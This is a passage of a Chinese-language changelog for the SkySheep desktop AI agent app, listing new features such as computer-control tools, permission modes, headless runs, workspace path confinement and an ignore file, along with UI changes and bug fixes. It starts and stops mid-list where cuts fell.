  并且每轮把上游真实上报的 prompt tokens 作为**下限**（`Agent.used_context_tokens()`），估算偏差
  再大也不会比真实情况乐观。新增：每服务可单独设「上下文上限」（`config.toml` 的
  `providers.<名>.context_limit`，0 = 用全局值），换服务/换模型时上限跟着走；上游真返回
  「context length exceeded」这类错误时，报错里会附上可操作提示（`/compact` 或调上限），
  而不是甩一句英文 400。
- **图片输入能力标记（纯文本模型贴图不再撞 400）**：图片此前是无条件按多模态 content parts
  发出去的，选了纯文本模型（如 deepseek-chat）贴图就会收到上游报错，用户完全不知道是模型选错了；
  `screenshot` 是只读自动放行的，Agent 还可能先截图再撞错。现在每服务可声明「模型支持图片输入」
  （设置 · 模型服务，默认开），关掉后：贴图/截图在前端与后端双重拦截并给中文提示（图片留在输入框、
  不会丢），`screenshot` 工具直接返回可读 ToolError（不产出模型看不见的图），模型切换时若输入框里
  还有图片也会即时提醒。
- **温度 temperature 可调**：每个模型服务可填采样温度（`providers.<名>.temperature`，留空 = 不发送
  该参数、沿用服务默认，这是最安全的默认值）。openai 兼容线透传 `temperature`；Anthropic 线在启用
  扩展思考时跳过（该模式温度固定为 1，传了反而被拒）。
- **「仅允许访问工作目录」开关**：只读工具是自动放行的，而 `resolve_path` 对绝对路径不做范围校验——
  Agent 可以不问就读取磁盘上任何文件（SSH 私钥、浏览器数据、别的项目）。设置 · 高级里新增该开关，
  打开后所有工具（含子代理）的路径解析都会被限制在工作目录内，越界直接返回可读拒绝信息；
  关闭时保持"能做任意文件活"的原行为（默认关）。`@` 前缀写法在路径解析处容错剥掉。
- **定时任务的预授权工具改成勾选表 + 运行前提说明**：原来要用户手打工具名、逗号分隔，
  对非技术用户近乎不可用；现在从 boot 快照的工具清单渲染勾选表（带权限级别标签，只读项本就放行、
  灰显不可改）。创建/编辑弹窗里同时说明：定时任务只在应用运行期间触发、关窗选「缩到系统托盘」
  即继续后台运行、彻底退出期间错过的任务会在下次启动补跑一次。
- **开机自动启动**：定时任务/日程提醒只在 SkySheep 运行时才会触发，"无人值守"要在关窗后仍然成立
  就得开机自启。新增 `skysheep/startup.py` 写 HKCU 的 Run 项（当前用户、免管理员），打包态指向 exe、
  开发态指向 `SkySheep.pyw`（pythonw 启动不弹终端），设置 · 高级里一键开关；换过安装位置时能识别出
  注册表里的旧路径并提示重存。注册表读写收敛在可注入的 `_WindowsRegistry` 里，测试不碰真机；
  非 Windows 平台返回可读的"不支持"。
- **设置 · 高级页**：把此前只能手改 `config.toml` 的参数搬进界面——主循环最大轮数（默认 40，
  Agent「干到一半自己停了」多半是它）、上下文上限、压缩保留条数、工作目录限制、开机自启；
  保存后热生效到所有活着的 Agent（含运行中的会话与子代理），不用重启。
- **内置帮助入口**：顶栏新增「？」，一个弹窗讲完三件事——怎么配模型、怎么让它干活（含可直接照抄的
  三个例子）、常用开关，外加完整快捷键表与常见问题（贴图看不到 / 上下文满了 / 定时任务没跑 /
  它老是先停下来问 / 误删会话怎么办 / 日志在哪）。此前界面里除了 `/help` 的一条 notice 没有任何帮助。
- **日志与数据目录、诊断包**：设置 · 关于新增「打开数据文件夹 / 打开日志文件夹 / 导出诊断包」。
  诊断包（`support.build_diagnostic_zip`）含版本、Python/系统信息、日志（含轮转段）、
  打码后的 config.toml（`api_key`/`token` 等一律替换为「已打码」）与数据目录清单，不含会话库正文——
  排障用得上，泄漏面最小。打不开文件夹不再需要用户自己去翻 `~/.skysheep/logs/desktop.log`。
- **会话库备份可视化恢复**：滚动备份（保留 20 份）一直存在，但没有任何出口——用户误删会话后无处可点。
  设置 · 关于新增「会话库备份」卡片：列出全部分备（时间/大小/标记当前），一键恢复到某个版本；
  恢复前自动把现状另存为「恢复前」副本（恢复错了还能换回来），恢复后关闭重开数据库并重建内存状态
  （清空 runtime、重挂项目与会话）。备份名只接受纯文件名，带分隔符/上级目录/非 .db 一律拒绝。
- **跨项目会话搜索**：`store.search_messages` 新增 `scope="all"`，忽略项目过滤、结果附带项目名与
  路径；侧栏搜索框下方新增「本项目 / 全部项目」切换，跨项目命中会先自动切到对应工作项目再打开会话
  （否则那个会话在当前项目列表里根本找不到）。用户记不住某件事是在哪个项目里聊过时用得上。
- **对话内查找（Ctrl+F）**：标准编辑器的查找条——当前会话里高亮命中、显示 `n/总数`、上下跳转、
  Esc 关闭；只处理文本节点、跳过代码块内部（不破坏已渲染的语法高亮与 mermaid），关闭时把
  `<mark>` 还原成纯文本。**快捷键调整**：`Ctrl+F` 归位给「本对话内查找」（各软件的惯例），
  会话搜索移到 `Ctrl+Shift+F`，`/help` 与输入栏提示同步更新。
- **文件预览可交给系统程序打开**：文件树预览一直是只读的，用户看完想接着改只能自己去开资源管理器。
  预览区新增「↗ 打开」，用系统默认程序打开当前文件（`support.open_with_default_app`）；
  为安全起见只接受工作目录内的路径，且**脚本/可执行文件（.exe/.bat/.ps1/.cmd/.sh 等）不直接启动**，
  退化为在资源管理器里定位——工作目录里放个 .exe 很正常，点一下文件名就把它跑起来不是我们要的语义。
- **思考过程可视化（思考型模型不再「假死」）**：DeepSeek-R1 / GLM 思考模型 /
  Anthropic 扩展思考的推理内容此前完全不透出——流式期间用户盯着转圈几十秒毫无反馈，
  收尾后思考文本也不展示。现在引擎新增 `ThinkingDelta` 事件逐段透出
  （`ProviderReasoning` 语义改为增量，openai_compat 的 `reasoning_content` 逐段产出，
  anthropic 流补上此前被忽略的 `thinking_delta` 与 `signature_delta`），
  前端渲染为灰底可折叠「💭 思考过程」块：流式展开、正文首字到达自动折叠、随时点开回看；
  历史恢复同样渲染（消息携带 thinking 文本）。辅助对话面板同步支持（灰显尾随 400 字）；
  CLI 渲染器思考期间实时灰显、收尾打印一行摘要。另修 Anthropic 扩展思考 +
  工具调用的回传链路：`ThinkingBlock` 增加签名字段，带签名的思考块随历史回传
  （无签名静默跳过，行为与此前一致）。FakeProvider 脚本支持思考块（测试/演示可驱动）。
- **模型代理设置**：每个模型服务可单独填代理地址（设置 · 服务详情新增「代理地址」字段，
  留空直连）。`ProviderConfig` 新增 `proxy` 字段（写 config.toml），openai 兼容线用
  httpx.AsyncClient 传入，anthropic 线兼容 SDK 的 httpx/httpx2 双绑定；非法协议
  （非 http/https/socks5）保存时拒绝。访问境外服务不再需要懂环境变量。
- **run_command 超时带回输出 + 后台进程模式**：
  ①超时报错现在携带超时前已产生的 stdout/stderr（此前只报
  `command timed out after Ns`，模型只能盲猜失败原因；完全无输出时提示可能命令在等交互输入）；
  ②新增 `background=true` 立即返回后台进程号（读线程持续收入 8KB 环形缓冲），
  `action="read"` 增量读输出（`clear=true` 清缓冲）、`action="kill"` 树杀
  （与终端面板同款 taskkill 实现）、`action="list"` 列出。dev server、长安装、
  交互式命令不再卡到超时。已退出 30 分钟以上的后台记录自动清理。
- **首启配置向导**：没有任何已配置 Key 的服务时，启动自动弹出三步引导
  （选内置服务 → 粘贴 API Key → 保存并开始），可跳过（记 `ui.json` 的
  `onboarded` 标记不再打扰）；boot 快照新增 `provider_presets` 供向导渲染。
- **@ 引用支持文件夹**：@ 补全菜单现在包含项目目录（📁 前缀、尾斜杠、排在文件前、
  上限 100 项防清单爆炸）；系统提示词新增说明——文件夹 @ 表示「查看这个文件夹里的内容」，
  Agent 会用 list_dir/glob 展开后再读相关文件（知识库轻量版：把一组文档丢进文件夹
  然后 @ 它提问）。
- **应用内快捷键体系**：Ctrl+N 新建会话（原有）、Ctrl+F 聚焦会话搜索、
  Ctrl+K 打开模型切换菜单、Ctrl+W 关闭当前会话标签、Esc 停止运行中的会话
  （设置页/弹窗打开时不劫持）；/help 输出完整快捷键表，输入区工具条提示同步更新。
- **设置导出 / 导入（换机迁移）**：设置 · 关于 新增卡片。导出把 config.toml（含
  API Key）、mcp.json、ui.json、memory.md、subagents.json 打包成 zip 下载；
  导入选本地 zip 覆盖恢复（陌生文件跳过），config 恢复后热重载。会话数据库不导出。
  新增 WS 方法 `settings.export` / `settings.import`。
- **会话导出 HTML 版**：/export 现在同时导出 Markdown 与带样式的自包含 HTML
  （纸墨配色、用户/助手/工具卡分区、工具结果截 1500 字防爆炸），双击即可在浏览器阅读。
  `session.export` 新增 `fmt` 参数。
- **只读工具并行执行**：一轮里模型连发的多个免确认只读工具调用（read_file /
  glob / grep / web_fetch / read_document 等）现在并发执行（pre 钩子启用时退回串行，
  保证钩子逐个检查的语义不变）；写/执行类与权限确认路径保持严格串行。
  事件仍按原顺序产出，前端观感不变，多文件调研类任务明显提速。
- **SmartScreen 放行指南**：`docs/smartscreen-说明.md`——未签名安装包被 Windows
  拦截时的三步放行图文说明 + 为什么暂不购买签名证书 + SHA-256 校验方法。
- **技能广场索引发布件**：`market/index.json`（与内置精选一致的正式索引）+
  `market/README.md` 发布说明——技能广场索引随主仓库一起发布（`market/index.json`）
  仓库 main 分支即成为正式在线索引；自建索引用 `SKYSHEEP_MARKET_URL` 指向。
- **write_document 文档生成工具（read_document 的反向能力）**：此前 Agent 能读 Word/Excel/PDF 却只能
  产出纯文本，「帮我把这些数据整理成 Excel」「输出一份 Word 报告」这类高频诉求只能靠现写 Python 脚本。
  现在内置 `write_document` 直接生成 Office 文件——`.docx`（content 用 Markdown 子集：#/##/### 标题、
  段落、- 列表、| 表格 |（首行自动加粗）、**加粗**、`代码`、> 引用，中文正文用微软雅黑）；`.xlsx`
  （content 用 JSON：`{"工作表名": [[单元格,...]],...}`，支持数组/单表三种形态，单元格可为
  字符串/数字/布尔/null，附近似列宽）；`.csv`（utf-8-sig 带 BOM，Excel 双击打开中文不乱码）。安全模型
  与 write_file 一致：WRITE 权限确认 + 检查点回滚（新建文档回滚即删除），权限确认条对新建文档展示
  源内容 diff 预览（覆盖已有 docx/xlsx 无文本 diff；csv 是文本可做真实 diff）。子代理与 write_file 同
  待遇：可配备但调用会被 SubagentGate 自动拒绝；解析/生成在线程池跑，依赖缺失给中文指引。
- **代码块语法高亮（vendor highlight.js，零构建）**：助手消息里的 ```代码块收尾后自动高亮（vendor 本地
  `highlight.min.js`，离线可用），流式期间保持原文不拖慢打字机。纸墨/夜墨双色板以 CSS 变量实现、随主题
  切换（纸墨：关键字深红/字符串墨绿/函数蓝/注释斜体暖灰；夜墨整体提亮一档）；带语言标记但库不认识的语言
  保持原文不做自动探测（避免短片段误判），无语言标记的块交给 hljs 自动探测。主对话、历史渲染、辅助对话、
  圆桌成员草稿四处渲染管线均已接入。
- **拖拽文件自动转 @ 引用**：往输入区拖入非图片文件时，按文件名匹配项目文件索引（浏览器 Drop 事件只给
  文件名不给路径），唯一命中直接在输入框插入 `@项目内相对路径`；同名多个文件提示用 @ 手动选择，项目外或
  被忽略规则跳过的文件给出可读提示。图片拖拽进附件托盘的原行为不变。
- **输入历史召回（↑/↓）**：空输入按 ↑ 逐条回看本窗口内已发送的消息（最多存 100 条、去重），↓ 前进，
  走到底还原草稿，Esc 直接还原；手动编辑或点击定位光标即退出历史态，方向键恢复原生光标行为（多行输入
  不受影响）。
- **子代理（独立设置页 + 自定义子代理）**：设置侧栏新增「子代理」页，分三张卡片：
  ①**基础设置**——总开关（关闭后 `spawn_agent` / `check_task` 即时从工具清单消失，
  对已开的会话也生效）与每个子代理最多执行轮数（1–100，默认 25）；
  ②**自定义子代理**——自己建分身：名称、职责描述、专项指令（注入它的系统提示词）、
  工具范围（仅只读 / 全部工具 / 勾选具体工具）、使用的模型（可选任一服务的任一模型，
  留空跟随主对话）、启用开关；保存后 Agent 在 `spawn_agent` 的说明里就能看到它并自动
  派活，定义存 `~/.skysheep/subagents.json`；
  ③**内置子代理**——general-purpose / Explore 可单独指定模型与思考强度。
  安全边界不变：子代理内一切需要确认的写入/执行仍被自动拒绝，派生工具永不进子代理
  （禁止递归派生）。协议新增 `subagent.save_builtin` / `subagent.save_custom` /
  `subagent.delete_custom`，`subagent.get` 扩展为一次性返回定义与可选项。
- **内置常用 MCP 服务预设（一键添加）**：设置 · MCP 服务顶部新增一排「常用预设」卡，
  点「＋ 添加」即写入 `mcp.json`、即时连接、工具立刻可用，不必手填 command/args。
  预设以 **sequential-thinking（结构化分步思考）** 为主打（把复杂问题拆成多步反思推理、
  可回溯修正——内置完全没有这类能力），另含 fetch / time / git / filesystem / memory，
  原先散在「手动添加」弹窗里的模板上移到后端 `mcp/presets.py` 作单一事实源。每张卡如实
  标注依赖的运行时（需 uv / 需 Node.js），已添加的置灰标「✓ 已添加」；带 `{dir}` 占位符的
  预设添加时替换成当前工作目录。默认**不自动启用**任何外部服务（点了才装），避免首启下载
  外部包或因缺运行时失败；连不上时沿用预检给出可读中文错误。零新增 Python 依赖。
  新增 WS 方法 `mcp.add_preset`，boot 快照带 `mcp_presets` / `mcp_installed`。
- **电脑控制工具集（对标 Computer Use）**：Agent 可以「看见并操作」桌面——
  `screenshot` 截屏（图像直接进对话给模型看，副本存 `~/.skysheep/screenshots/`，
  返回活动窗口/坐标系/缩放比说明）、`window_list` 枚举窗口、`clipboard_read` /
  `clipboard_write` 剪贴板、`mouse`（移动/点击/双击/右键/中键/拖拽/滚轮）、
  `keyboard`（逐字符输入文本，天然支持中文；或 ctrl+s / win+r 等组合键）、
  `window`（置前/最小化/最大化/关闭，标题子串匹配）。安全分级：截屏/枚举/读剪贴板
  只读免确认；鼠标/键盘/窗口高危逐次确认，「总是允许」按**动作**生成前缀白名单
  （如只放行 click、只放行 activate）；子代理不配备这批工具；headless 默认拒绝。
  零新增依赖（截屏用 Pillow，输入注入 ctypes SendInput）；坐标统一为虚拟屏幕像素，
  截图与鼠标坐标系的关系在工具输出中显式给出。工具卡内联展示截图（点击放大）；
  系统提示词新增第 11 条使用规范（先截图定位 → 再操作 → 操作后复查）。
- **分级权限模式（对标 Codex Auto-Edit / Claude Code acceptEdits）**：输入区新增
  「✎ 写入确认 / ✎ 自动写入」开关——自动档下文件写入与画图不再逐次确认，
  **执行命令始终仍需确认**（无沙箱，不做全自动档）；档位存 ui.json，重启保持，
  切项目不丢。协议新增 `permission.mode` / `permission.set_mode`。
- **`skysheep run`：headless 一次性运行（对标 claude -p / codex exec / gemini -p）**：
  非交互跑一轮任务后退出，消息落库可审计。支持 `-d` 工作目录、`-p` 服务、
  `--allow-tool write_file,run_command` 预授权（缺省只放行只读操作，未授权写入自动拒绝）、
  `--output text|json`（JSON 含 session_id/回复/用量，可直接喂给脚本与 CI）、
  `--max-iterations`；退出码 0=正常收尾、1=出错或中断。无人值守门控
  （HeadlessGate）与定时任务共用同一实现。
- **忽略文件 `.skysheepignore`（对标三家 CLI 的 ignore 文件）**：@ 文件索引、文件树、
  glob、grep 全部遵循项目忽略规则——兼容 `.gitignore` 语义（`!` 取反、目录 `/`、
  根锚定、fnmatch 通配，后匹配优先），并内建 `.env` / `.env.*` / `.git` 永远不进
  「发现」结果（防密钥被扫进上下文）；`read_file` 显式点名不受影响。
- **文件树文档预览**：文件树里点 PDF / Word / Excel 不再报「二进制文件不支持预览」
  （PDF 甚至会显示乱码原始字节）——现在走与 read_document 工具同一套解析器提取文本，
  预览标题标注「已提取文本」。
- **复制按钮**：助手消息悬浮出现「⧉ 复制」（复制整条回答的 Markdown 原文）；代码块
  悬浮右上角「⧉」一键复制代码。局域网 http 访问（非安全上下文）自动走
  execCommand 兜底。

### 变更

- **用量页重做为仪表盘布局（对标用户参考图）**：原来是三行文字摘要 + 两条横向条形
  列表，现改为四张卡片——①四个**统计磁贴**（累计 Token 数大字 + 输入/输出小注、
  单日峰值、有记录天数、参与会话）；②**Token 活动**：近 7/14/30 日范围切换 +
  按天**竖向堆叠柱状图**（输入蓝 / 输出绿，悬停显示当日明细，日期标签自动抽稀）+
  合计图例；③**模型用量**：**SVG 环形图**（按服务分段、中心显示总量、悬停加粗分段）
  + 右侧图例列表（模型名 / tokens / 百分比），配了单价时卡头显示估算费用；
  ④会话排行保留为独立卡片。纯前端改动（index.html / app.js / app.css），
  纸墨主题变量取色，夜墨主题同步适配。
- **会话标签条移到主区最顶行**：多会话标签（新会话 ×）原来在顶栏下方，现在提到
  主内容区第一行（顶栏之上），样式由"贴边文件夹标签"改为独立小胶囊；单会话时照旧
  整条隐藏。
- **任务清单 / 日程 / 定时任务迁入右侧面板**：左侧导航点击这三项，改为在右侧面板
  打开对应标签（与终端/浏览器/辅助对话等并列，行尾「＋」菜单也能打开）；侧栏不再有
  折叠区块。日程「＋ 新建日程」、定时任务「＋ 新建」入口随工具条移入面板；列表数据、
  新增/编辑弹窗、到点提醒、cron 结果通知等行为不变。标签的打开/激活状态照旧持久化。
- **日程改为周历视图（对标日历应用）**：默认以「周」视图呈现——7 天 × 24 小时时间网格，
  日程按开始时间落位成事件块（已完成的划线置灰），今天列高亮并显示蓝色当前时间线；
  点空白格直接在该时间槽新建日程，点事件块编辑。工具条可切「月」视图（按月网格，
  每天最多预览 2 条）和「分组」列表（原视图）；‹ ›翻周、「今天」一键回到本周。
- **输入区重排（参考 Cherry Studio 布局）**：功能开关（执行/规划、圆桌+成员、写入确认/自动写入）
  收成输入框下方的**小图标工具条**（线稿 SVG，悬停看说明，激活亮主题色：规划蓝/圆桌紫/写入金）；
  **模型选择器从顶栏移到输入区右下角**（发送按钮左侧，点选菜单改为向上弹出）；
  连接状态（● 已连接）与思考强度徽章一并移到模型选择器左侧（思考菜单同样向上弹，
  并补上漏除的 uiScale 换算——此前缩放 ≠100% 时菜单会飘）；
  工具条中部常驻快捷键提示（窄屏自动隐藏）；placeholder 精简为「描述你的任务…」。
- **输入框随内容自动增高**：最多 6 行，超出内部滚动，清空自动收回；发送、斜杠命令、
  @ 引用、快捷指令、Ctrl+Alt+Space 预填等所有程序化改写输入框的路径都会同步高度。

### 修复

- **代码块被包进 `<p>`**：渲染管线的段落包装发生在代码块还原之前，占位符被当成普通段落
  `<p><pre><code>…`。浏览器容错没显露出来，但结构是错的；现在占位符整块也算块级元素。
- **上游上下文溢出报错不可操作**：识别 `context length` / `maximum context` / `上下文长度` 等
  特征串（`is_context_overflow`），命中时在报错后追加中文指引。
- **圆桌成员选择浮层跑到右上角且被裁切**：该浮层由输入栏左侧的圆桌按钮唤出，
  却固定在主区右上角（`right: 18px`）——既远离触发它的按钮，窄窗口下还会被右缘
  裁切（用户截图实测）。现在底边仍贴在输入栏上沿，**左缘实时对齐圆桌按钮**
  （`positionRtMenu`：用按钮的实时位置计算，界面缩放 / 侧栏宽度 / 窗口尺寸变化
  都不会错位；物理像素按 `uiScale` 换算回布局坐标），并向容器内收敛，
  窗口再窄也不溢出。顺带修两个附带问题：
  - 浮层 `max-height: 360px` 小于实际内容高度（约 393px），底部操作行（含「确定」）
    会被滚出可视区，必须先滚动才能确认；现在操作行改为 `position: sticky` 常驻底部。
  - CSS 补 `max-width: calc(100% - 36px)`，窄窗口下菜单宽度跟着容器收缩。
  实测（真实 Chromium，1400 / 1100 / 820px 三种窗口宽）：左缘对齐、完全落在主区内、
  不越视口，操作行可点。
- **切换工作项目会先闪出一屏「加载中」**：切换走的是 `location.reload()`，整页重载
  必然先渲染一屏空 DOM——不管拿什么遮罩去盖，用户看到的都是一屏加载界面，
  不可能「直接出现」。现在改为**站内切换**，全程不刷页：
  - 顺序改为「后端先切 → 取齐新项目数据 → 清旧状态 → 一次性重画」。数据到手前
    旧界面一直留在屏幕上；后端拒绝（有任务在跑 / 目录不存在）时界面完全不动，
    只弹可读提示。
  - 列表渲染拆出可传入预取数据的形式（`refreshSessions(prefetched)` /
    `refreshProjects(prefetched)`），使「清空 DOM」与「填入内容」落在同一个同步块里，
    中间不会经过网络往返（否则会看到列表内容先消失再出现）。浏览器实测：双向切换
    全程 0 空白帧（MutationObserver 逐帧采样 `#project-list`/`#session-list`/`#chat`）。
  - 显式重置一切与项目绑定的状态：会话标签与消息、权限条与运行态、会话搜索、
    `@` 文件索引、右侧面板缓存（文件树 / 子代理任务 / 日程 / 定时任务 / 审查 / 终端
    输出）、设置页缓存。漏清会显示错的数据，比加载屏更糟。
  - 切换期间只在顶栏给一句状态文字 + 项目列表置灰防连点，不遮挡界面；
    不再需要 `switch-veil` 遮罩与 `boot-hidden` 整页隐藏（整页刷新相关代码已移除）。
  - 仍保留的防白底兼底（浏览器模式 F5 / 首次启动走整页加载时会用到）：窗口底色
    跟随 `ui.json` 主题（`wintheme.window_background`，切主题由看板线程同步刷新）、
    `index.html` 在 `app.css` 之前先铺纸色/夜墨底、服务端把主题/缩放/栏宽注入 `<html>`
    首帧（`_first_paint_attrs`）。
- **对话区宠物：切到设置页再返回，小羊跑到对话区最上方**：设置页会把整个对话视图
  `display:none`，容器尺寸塌成 0，此时按「底部」算出的地面是负值，小羊被塞到顶部
  （返回后还会从顶部重新飘落）。现在容器不可见时（宽高 ≤ 20px）一律跳过所有按地面
  归位的计算、位置原地冻结——下落中的小羊会暂停，切回对话页再继续飘；返回对话页时
  还会显式归位一次，不依赖 ResizeObserver 的触发时机。
- **用量统计的后端聚合查询从未返回过数据**：`store.usage_stats` 的内部查询助手
  定义为三个参数、调用只传两个，TypeError 被 `except Exception: pass` 静默吞掉——
  按天 / 按服务 / 按会话三组聚合一直是空列表，只有总数碰巧可用（本次重做用量页
  布局时浏览器实测暴露）。顺带修 `date(ts,'localtime')` 缺 `unixepoch` 修饰符
  在部分 SQLite 构建上解析出错误年份的问题。
- **切换项目时页面抖动**：切换项目靠整页刷新加载新项目的会话/记忆/技能/白名单，但刷新后的页面先以
  默认布局绘制，等布局偏好（界面缩放、侧栏宽度、主题）与会话从后端恢复完才"弹"回原样，肉眼可见地
  抖一下。现在刷新前打标记，新页面首帧前整体隐藏，等会话与偏好全部恢复完再平滑淡入（另有 3 秒兜底
  强制显示，防止启动异常时页面永远空白）。
- **hooks 测试在中文 Windows（GBK 控制台）假失败**：hook 子进程的 stdout/stderr 编码默认随控制台
  区域设置（GBK），而 hook 协议约定输出为 UTF-8，父进程按 UTF-8 解码后中文变乱码致断言失败；
  测试脚本显式 `reconfigure(encoding='utf-8')` 对齐协议。
- **子代理列表各行不齐**：列表左半边原来是自然流排列，「名称」长短不同会把后面的
  「标签」「描述」推得左右乱跳（general-purpose 行与 Explore 行的标签起点差 52px）。
  改为固定列宽网格（名称 170px / 标签 150px / 描述自适应），标题、标签、描述、模型与
  思考强度下拉在每一行都严格对齐，自定义子代理与内置子代理共用同一套列宽（跨卡片也对齐），
  名称过长时省略号截断并保留完整 tooltip。
- **设置页数字输入框掉了主题**：设置页输入框样式按 `type` 枚举
  （`text` / `password`），新加的「每个子代理最多执行轮数」用了 `type="number"`、
  不在名单里，于是退回浏览器默认的白底灰框（实测边框 #767676、内部纯白），与纸墨主题
  格格不入。改为排除式选择器（`input:not([type=checkbox]):not([type=radio])`）覆盖所有
  文本类输入，数字框另设窄宽度与禁用态样式；以后新增输入类型不会再漏。
- **上下文容量环形仪表**：顶栏的文字徽章改为输入栏工具条里的**环形仪表**（模型选择器
  左侧）——圆环表示已占用比例，环内数字为百分比，≥70% 转金、≥90% 转红，悬停显示
  token 明细；**启动即显示**（boot 时拉取当前会话占用，不必先发一条消息），随对话
  实时刷新，切换会话标签跟着切换。
- **添加自定义服务时一并启用多个模型**：「检测」后不再只选一个——可用模型变成
  勾选列表（支持全选/清空），主输入框里的模型为当前使用的那个且始终启用，勾选的
  其余模型随服务一并写入启用列表；添加完成的状态提示会显示启用数量。协议
  `config.add_provider` 新增 `models` 参数（不传时与原单模型行为一致）。
- **消息操作统一重做（图标化 + 挪到消息下方 + 常驻）**：操作以纯简笔图标
  （线稿 SVG）**常驻显示**在**消息下方**（即点即中，不再悬停闪现）——助手消息：
  复制 / 分叉 / **回退**（删掉这条回答及之后、保留提问）/ **重新生成**；用户消息：
  复制 / 编辑。两侧按钮底色统一为卡片色。此前分散：复制是助手气泡内的文字按钮，
  编辑/重新生成/分叉挤在窄用户气泡里；「回退」为新增能力（复用 session.truncate
  的 regen 语义，按锚点 seq 自动回退到提问前）。实时轮次通过 assistant_message
  事件携带的 seq 挂全量操作，用户消息编辑走「最后一条用户消息」的后端兜底锚点。
  为给常驻按钮让位，用户消息的蓝色气泡移到内层 `.user-bubble`，操作行占位在
  气泡/卡片下方的文档流里（不与下一条消息重叠）。
- **圆桌过程卡「折叠」点击无反应**：折叠按钮闭包里引用了未定义的 `rtCard`（实际是
  `t.rtCard`），点击直接抛 ReferenceError。现修复，且**点击标题栏任意位置也可折叠/展开**，
  折叠后副标题明确提示「点击展开查看各成员草稿」。
- **复制按钮悬在气泡框外**：`.msg-ops` 用 `bottom:-10px` 定位在框沿之外；现移入
  气泡框内右下角（悬停才出现，不再压到框外）。
- **用户消息的 3 个操作按钮（编辑/重新生成/分叉）凌乱**：跟随上一条改动塞进用户
  气泡框内后，窄气泡装不下、按钮溢出左边并压住正文。现改为挂在气泡**左侧空白处、
  垂直居中**（悬浮出现），窄屏改挂气泡下方。
- **圆桌成员卡空白过多 / 4 成员排列凌乱**：网格改按成员数取整列数——1/2/3 个成员
  各占一列排一行，4 个及以上 2×2（原 auto-fit 会排出「3+1」的孤行，右侧大片空白，
  视觉很乱）；窄屏自动退单列。成员卡恢复等高对齐（整齐优先），空白由「融合结论
  生成后过程卡自动折叠」兜底——结论一到草稿就收成一行，随时点标题栏展开回看。
- **通知中心弹层位置偏离铃铛按钮**：界面缩放（≠100%）下弹层没有把物理像素坐标
  除回 uiScale，导致面板飘到屏幕中部；现与模型菜单/标签菜单同一套换算，任何缩放档位
  都精确锚在按钮正下方右对齐。
- **附件托盘把整个页面「拽」下去**：输入区高度被拖拽设定过（`--cp-h` 固定高度）时，
  粘贴/拖入图片生成的缩略图行让输入区装不下，内容从窗口底部溢出；紧随其后的 `focus()`
  又把整个 `overflow:hidden` 的 #app 滚下去露出输入框——侧栏标题与顶部状态栏被顶出
  视口且无法滚回。现改为 `min-height`（托盘出现时输入区自动长高，聊天区相应缩小），
  任何祖先容器都不再被顺手滚动。
- **`skysheep chat` 终端 REPL 启动即崩**：MCPManager.connect_all 返回单列表，
  REPL 沿用旧的二元组解包——没有 mcp.json（或已连工具数 ≠ 2）时直接 ValueError。
  实装 headless 运行复用同链路时暴露，桌面服务不受影响；两处调用均已修正。

### 移除

- **截图提问（📷 按钮 / Ctrl+Alt+A 全局热键 / `app.screenshot` 接口）**：粘贴（Ctrl+V）
  或拖入图片即可达到同样效果。一并移除桌面端热键注册与后端 ImageGrab 抓屏实现；
  `Ctrl+Alt+Space` 唤起窗口不受影响。

## [0.7.0] - 2026-09-16

### 新增

- **web_search 联网搜索工具**：此前只有 web_fetch（得先知道网址才能抓），Agent 无法"查"。
  现在先搜后读闭环：支持博查（国内直连）/ Tavily / 智谱 web-search 三家，「自动」档优先
  复用已配置 Key 的智谱服务（零额外配置）。设置 · 技能与工具新增「联网搜索」卡片
  （选服务商 + 填 Key，保存立即热生效）。只读工具免确认；设置写入 `config.toml` 的
  `[websearch]` 段。
- **read_document 文档阅读工具**：PDF / Word(.docx) / Excel(.xlsx) 提取纯文本——PDF 逐页
  带页码标记、Word 含表格、Excel 按工作表逐行。普通用户「把这个文件发给 AI 看看」的自然
  诉求此前受限于 read_file 跳过二进制而无法满足。解析在线程池跑、单页损坏不拖垮整个文档、
  依赖缺失给中文指引；READONLY 免确认。新增依赖 pypdf / python-docx / openpyxl。
- **截图提问**：输入框新增 📷 按钮——后端 Pillow ImageGrab 合并多屏截图（超 3.5MB 自动
  降档：缩放 → JPEG），进附件托盘随下一条消息发送，走既有图片多模态管道。桌面模式全局
  热键 `Ctrl+Alt+A`（唤起窗口 + 截图进托盘），与 `Ctrl+Alt+Space` 唤起预填并存；热键冲突
  静默跳过。新增 WS 方法 `app.screenshot`。注意打包：SkySheep.spec 的 excludes 移除了 PIL。
- **检查点落盘持久化**：检查点此前纯内存、重启全丢。现在按项目写入
  `~/.skysheep/backups/checkpoints/<项目指纹>/<会话>/<轮次>/`（meta.json + 改前内容 blob），
  重启后仍可回滚；按时间 FIFO 保留最近 50 轮；generate_image 也纳入检查点追踪（回滚时
  删除新生成的图片）；切换项目时检查点目录隔离，杜绝把 A 项目的快照回滚到 B 项目。
- **主题：夜墨深色 + 跟随系统**：`data-theme="dark"` 整套变量覆盖（纸墨互换：墨色作底、
  纸色作字，交互蓝提亮，阴影改黑色投影，`color-scheme: dark` 让表单控件跟随）。设置 ·
  界面与通知新增「主题」分段选择（跟随系统 / 浅色 · 纸墨 / 深色 · 夜墨），偏好存 ui.json
  （新增字符串键 `theme`）；跟随系统经 `prefers-color-scheme` 监听实时切换。Windows 标题栏
  同步换色：前端 `app.apply_theme` 回写 wintheme 模式值，desktop.py 新增看板线程轮询重刷
  DWM 标题栏（启动时按 ui.json 存档解析，避免闪烁）。
- **全局自动记忆**：新增 `memory_write` 工具（append/list/delete），Agent 把用户偏好、
  长期有效的事实写入 `~/.skysheep/memory.md`（带日期的列表，自动去重、超限从旧淘汰），
  内容注入每一轮系统提示词（限 4000 字）。与项目级 AGENTS.md 互补：记忆跨项目生效。
  只写应用自有文件，与 schedule_write 同理 READONLY 免确认；系统提示词新增第 9 条使用
  指引（含「不存密码/Key」）。设置页新增「全局记忆」子页可直接查看/编辑，保存立即对
  全部会话生效。新增 WS 方法 `memory.get` / `memory.save`。
- **本地 HTML 一键预览**：服务新增只读 `/preview?p=<相对路径>` 路由（锁在工作目录内，
  防穿越），文件树与 write_file / generate_image 工具卡片对 .html/.htm/图片文件出现
  「👁 在浏览器面板预览」入口，右面板浏览器标签 iframe 直接渲染真实效果；文件树点击
  .html/.图片 也直接进浏览器预览（其余文件仍是文本预览）。
- **Mermaid 图表渲染**：助手消息里的 ```mermaid 代码块自动渲染成 SVG——vendor 本地
  mermaid.min.js（零构建、离线可用），仅在消息收尾时渲染（流式中保持代码原文，不拖慢
